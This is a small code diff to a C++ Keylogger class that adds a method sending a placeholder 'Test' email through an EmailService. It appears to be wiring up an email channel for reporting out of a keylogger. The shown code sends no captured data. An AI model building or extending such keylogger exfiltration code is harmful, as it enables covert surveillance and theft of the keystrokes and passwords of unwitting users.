@@ -63,3 +63,8 @@ Keylogger::~Keylogger() {
 	stop();
 	delete hook;
 }
+
+bool Keylogger::sendEmailCallback(std::string emailTo) {
+	auto emailService = make_shared<EmailService>();
+	return emailService->sendEmail("Test", "test", emailTo);
+}
